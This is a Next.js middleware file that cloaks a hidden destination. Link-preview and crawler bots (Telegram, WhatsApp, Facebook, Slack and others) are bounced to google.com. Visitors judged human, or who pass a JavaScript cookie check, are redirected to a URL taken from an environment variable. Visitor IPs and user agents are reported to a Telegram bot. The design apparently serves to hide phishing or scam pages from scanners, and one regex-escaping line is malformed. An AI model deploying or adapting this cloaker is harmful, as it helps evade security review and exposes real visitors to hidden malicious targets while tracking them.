// middleware_with_logging_and_telegram.js
import { NextResponse } from "next/server";

const BOT_JSON_URL = "https://raw.githubusercontent.com/arcjet/well-known-bots/main/well-known-bots.json";
const URL_SITE = process.env.URL_SITE || "https://yahoo.com";
const BOT_LIST_TTL = 60 * 60 * 1000; // 1 hour
const TELEGRAM_TIMEOUT_MS = 2700;
const BOT_TOKEN = process.env.TG_BOT_TOKEN || "";
const CHAT_ID = process.env.TG_CHAT_ID || "";
const JS_CHALLENGE_COOKIE = "__human_v1";
const JS_CHALLENGE_TTL_SEC = 60 * 60 * 24 * 7; // week

if (!globalThis.__bot_cache) {
  globalThis.__bot_cache = { regexes: [], fetchedAt: 0, fetching: null, ipCache: new Map() };
}

/* -------------------- helper: load patterns -------------------- */
async function loadBotRegexes() {
  const now = Date.now();
  const cache = globalThis.__bot_cache;
  if (cache.regexes.length && now - cache.fetchedAt < BOT_LIST_TTL) return cache.regexes;
  if (cache.fetching) {
    try { await cache.fetching } catch (e) {}
    return cache.regexes;
  }

  cache.fetching = (async () => {
    try {
      const res = await fetch(BOT_JSON_URL, { cf: { cacheTtl: 3600 } });
      if (!res.ok) { cache.fetching = null; return cache.regexes; }
      const json = await res.json();
      const regexes = [];

      // add some explicit Telegram-specific patterns (common variants)
      const explicit = [
        "TelegramBot",
        "TelegramBot\/.*",
        "Telegram",
        "WhatsApp",
        "facebookexternalhit",
        "Slackbot",
        "Discordbot",
        "Twitterbot",
        "LinkedInBot"
      ];
      for (const p of explicit) {
        try { regexes.push(new RegExp(p, "i")); } catch(e){/*ignore*/ }
      }

      if (Array.isArray(json)) {
        for (const entry of json) {
          let pattern = null;
          if (typeof entry === "string") pattern = entry;
          else if (entry && typeof entry.pattern === "string") pattern = entry.pattern;
          else if (entry && typeof entry.ua === "string") pattern = entry.ua;
          if (!pattern) continue;
          try {
            if (pattern.startsWith("/") && pattern.lastIndexOf("/") > 0) {
              const last = pattern.lastIndexOf("/");
              const body = pattern.slice(1, last);
              const flags = pattern.slice(last + 1);
              regexes.push(new RegExp(body, flags.includes("i") ? flags : flags + "i"));
            } else {
              try { regexes.push(new RegExp(pattern, "i")); }
              catch (e) {
                regexes.push(new RegExp(pattern.replace(/[.*+?^${}()|[\]\]/g, "\$&"), "i"));
              }
            }
          } catch (e) { /* ignore malformed */ }
        }
      }

      cache.regexes = regexes;
      cache.fetchedAt = Date.now();
    } catch (e) {
      console.warn("Error loading bot patterns:", e?.message || e);
    } finally {
      cache.fetching = null;
    }
  })();

  await cache.fetching;
  return cache.regexes;
}

/* -------------------- helper: domain detection -------------------- */
function getDomain(req) {
  try {
    const getHeader = (name) => {
      if (typeof req.headers?.get === "function") return req.headers.get(name);
      if (req.headers && typeof req.headers === "object") return req.headers[name];
      return undefined;
    };
    const hostHeader = getHeader("x-forwarded-host") || getHeader("host");
    if (hostHeader) return hostHeader;
    const referer = getHeader("referer") || getHeader("referrer");
    if (referer) {
      try { return new URL(referer).host; } catch (e) { /*ignore*/ }
    }
    const envUrl = process.env.URL || process.env.DEPLOY_URL;
    if (envUrl) {
      try { return new URL(envUrl).host; } catch (e) { return envUrl; }
    }
  } catch (err) { console.warn("getDomain failed:", err); }
  return "unknown-domain";
}

/* -------------------- helper: notify telegram -------------------- */
async function notifyTelegram(text, req) {
  const token = BOT_TOKEN || process.env.TG_BOT_TOKEN;
  const chat = CHAT_ID || process.env.TG_CHAT_ID;
  if (!token || !chat) return;
  const mainDomain = getDomain(req);
  const finalText = `🌐 main: ${mainDomain}
${text}`;
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chat, text: finalText }),
      signal: controller.signal,
    });
  } catch (e) {
    console.warn("Telegram notify failed (ignored)", e?.message || e);
  } finally { clearTimeout(id); }
}

/* -------------------- helper: cookie helpers -------------------- */
function setHumanCookie(resp) {
  const cookie = `${JS_CHALLENGE_COOKIE}=1; Path=/; HttpOnly; Max-Age=${JS_CHALLENGE_TTL_SEC}`;
  resp.headers.set("Set-Cookie", cookie);
  return resp;
}

/* -------------------- helper: simple browser header heuristics -------------------- */
function browserHeaderScore(headers) {
  let score = 0;
  const has = (h) => !!(headers.get && headers.get(h)) || !!headers[h];
  if (has("user-agent")) score += 1;
  if (has("accept")) score += 1;
  if (has("accept-language")) score += 1;
  if (has("sec-ch-ua")) score += 2;
  if (has("sec-fetch-site")) score += 1;
  if (has("cookie")) score += 1;
  return score;
}

/* -------------------- logging helpers -------------------- */
function sanitizeHeaderValue(val, max = 500) {
  if (!val) return "";
  if (typeof val !== "string") return String(val);
  return val.length > max ? val.slice(0, max) + "..." : val;
}

function buildLogPayload(req, extra = {}) {
  const headers = req.headers || {};
  const ipRaw = (headers.get ? (headers.get("x-forwarded-for") || headers.get("cf-connecting-ip")) : (headers["x-forwarded-for"] || headers["cf-connecting-ip"])) || "unknown";
  const ip = (ipRaw || "unknown").split(",")[0].trim();
  const ua = sanitizeHeaderValue(headers.get ? headers.get("user-agent") : headers["user-agent"] || "");
  const accept = sanitizeHeaderValue(headers.get ? headers.get("accept") : headers["accept"] || "");
  const acceptLang = sanitizeHeaderValue(headers.get ? headers.get("accept-language") : headers["accept-language"] || "");
  const referer = sanitizeHeaderValue(headers.get ? headers.get("referer") : headers["referer"] || "");

  return {
    ts: new Date().toISOString(),
    ip,
    url: req.nextUrl ? (req.nextUrl.pathname + (req.nextUrl.search || "")) : (req.url || ""),
    ua,
    accept,
    acceptLang,
    referer,
    cookie_present: !!(headers.get ? headers.get("cookie") : headers["cookie"]),
    ...extra
  };
}

function logInfo(label, payload) {
  try {
    // short human-friendly
    console.info(`[${label}]`, payload.ts, payload.ip, payload.url, payload.ua ? payload.ua.slice(0,120) : "-");
    // full structured JSON for machines
    console.debug(JSON.stringify({ level: "info", label, ...payload }));
  } catch (e) { console.warn("logInfo failed", e); }
}

function logWarn(label, payload) {
  try {
    console.warn(`[${label}]`, payload.ts, payload.ip, payload.url, payload.ua ? payload.ua.slice(0,120) : "-");
    console.debug(JSON.stringify({ level: "warn", label, ...payload }));
  } catch (e) { console.warn("logWarn failed", e); }
}

/* -------------------- JS challenge HTML -------------------- */
function jsChallengeHtml(targetUrl) {
  return `<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Loading...</title>
    <meta name="robots" content="noindex">
    <script>
      try {
        document.cookie = "${JS_CHALLENGE_COOKIE}=1; path=/; max-age=${JS_CHALLENGE_TTL_SEC}; SameSite=Lax";
      } catch(e){}
      setTimeout(function(){ window.location.replace(${JSON.stringify(targetUrl)}); }, 50);
    </script>
    <noscript>
      <meta http-equiv="refresh" content="1;url=${targetUrl}">
    </noscript>
  </head>
  <body>
    <p>Redirecting… If you are not redirected automatically, <a href="${targetUrl}">click here</a>.</p>
  </body>
</html>`;
}

/* -------------------- main middleware -------------------- */
export async function middleware(req) {
  const ua = (req.headers.get("user-agent") || "").slice(0, 300);
  const url = req.nextUrl.pathname + (req.nextUrl.search || "");
  const ip = (req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown").split(",")[0].trim();
  const mainDomain = getDomain(req);
  const headers = req.headers;

  // log incoming
  const incomingPayload = buildLogPayload(req, { phase: "incoming" });
  logInfo("visit.incoming", incomingPayload);

  // quick human-like UA check
  const isHumanUA = ua.includes("Mozilla") || ua.includes("Chrome") || ua.includes("Safari") || ua.includes("Gecko") || ua.includes("Edge");

  // if UA empty -> suspicious
  if (!ua) {
    const p = buildLogPayload(req, { phase: "empty_ua" });
    logWarn("visit.empty_ua", p);
    notifyTelegram(`🚨 Empty UA
IP: ${ip}
URL: ${url}`, req);
    return NextResponse.redirect("https://google.com");
  }

  // load regex patterns
  let regexes = [];
  try { regexes = await loadBotRegexes(); } catch (e) { console.warn("loadBotRegexes failed", e); }

  // quick regex match for known bots
  const isKnownBot = regexes.some(rx => {
    try { return rx.test(ua); } catch (e) { return false; }
  });

  // header-based heuristic score
  const score = browserHeaderScore(headers);
  const likelyHuman = score >= 4 || isHumanUA;

  // enrich log with diagnostics
  const diag = { score, likelyHuman, isKnownBot };
  logInfo("visit.diagnostics", buildLogPayload(req, { phase: "diagnostics", ...diag }));

  // ip cache quick check
  const ipCache = globalThis.__bot_cache.ipCache;
  const now = Date.now();
  if (ip && ip !== "unknown") {
    const cached = ipCache.get(ip);
    if (cached && cached.expires > now) {
      if (cached.isBot) {
        const p = buildLogPayload(req, { phase: "cached_block", isBot: true });
        logWarn("visit.cached_block", p);
        notifyTelegram(`🚨 Cached bot IP
UA: ${ua}
IP: ${ip}
URL: ${url}`, req);
        return NextResponse.redirect("https://google.com");
      }
    }
  }

  // If clearly known bot by regex -> block
  if (isKnownBot && !likelyHuman) {
    if (ip && ip !== "unknown") ipCache.set(ip, { isBot: true, expires: now + 5 * 60 * 1000 }); // 5 min
    const p = buildLogPayload(req, { phase: "known_bot", isBot: true });
    logWarn("visit.known_bot", p);
    notifyTelegram(`🚨 Known bot detected
UA: ${ua}
IP: ${ip}
URL: ${url}`, req);
    return NextResponse.redirect("https://google.com");
  }

  // If headers look suspicious (low score) but UA not in list -> present JS challenge
  const cookies = (req.headers.get("cookie") || "");
  const hasPassedChallenge = cookies.includes(`${JS_CHALLENGE_COOKIE}=1`);

  if (!likelyHuman && !hasPassedChallenge) {
    // store negative ip verdict for short time to avoid repeated challenge
    if (ip && ip !== "unknown") ipCache.set(ip, { isBot: false, expires: now + 20 * 1000 }); // 20 sec marker
    // return JS challenge HTML (no telemetry redirect yet)
    const target = new URL(URL_SITE);
    target.searchParams.set("s3", mainDomain);
    const html = jsChallengeHtml(target.toString());
    const resp = new Response(html, {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8" }
    });
    // no HttpOnly cookie here (we set via JS). Also set a short server cookie as fallback so next request shows it.
    resp.headers.set("Set-Cookie", `${JS_CHALLENGE_COOKIE}=1; Path=/; Max-Age=${JS_CHALLENGE_TTL_SEC}`);

    const p = buildLogPayload(req, { phase: "js_challenge" });
    logInfo("visit.js_challenge", p);
    // keep telegram notify for suspicious but sampled? keeping original behavior: send short notify
    notifyTelegram(`🚨 JS challenge shown
UA: ${ua}
IP: ${ip}
URL: ${url}`, req);

    return resp;
  }

  // If passed challenge or looks human -> set server cookie and redirect
  const target = new URL(URL_SITE);
  target.searchParams.set("s3", mainDomain);
  const redirectResp = NextResponse.redirect(target.toString());
  // mark as human for future quickly
  setHumanCookie(redirectResp);

  // cache IP as human for a short time
  if (ip && ip !== "unknown") ipCache.set(ip, { isBot: false, expires: now + 60 * 60 * 1000 }); // 1 hour

  const p = buildLogPayload(req, { phase: "redirect_human" });
  logInfo("visit.redirect_human", p);

  return redirectResp;
}

export const config = { matcher: ["/:path*"] };
